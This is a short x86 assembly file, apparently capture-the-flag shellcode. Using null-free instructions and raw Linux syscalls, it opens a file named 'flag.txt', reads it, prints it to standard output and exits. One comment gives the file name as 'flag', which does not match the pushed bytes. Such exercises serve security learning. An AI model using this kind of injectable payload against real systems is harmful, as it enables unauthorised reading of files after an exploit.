BITS 32
global _start

section .text progbits alloc exec write align=16

_start:

xor eax, eax
add al, 5
xor ecx, ecx ; read only
push ecx
push 0x7478742e
push 0x67616c66
mov ebx, esp
int 0x80 ; open("flag", 0)

xor ebx, ebx
add bl, 0xff
sub esp, ebx
lea ecx, [esp]
mov ebx, eax
xor eax, eax
add al, 3
xor edx, edx
add dl, 0xff
int 0x80

mov edx, eax
xor eax, eax
add al, 4
xor ebx, ebx
add bl, 1
int 0x80

xor eax, eax
mov ebx, eax
add al, 1
int 0x80 ;exit(0)


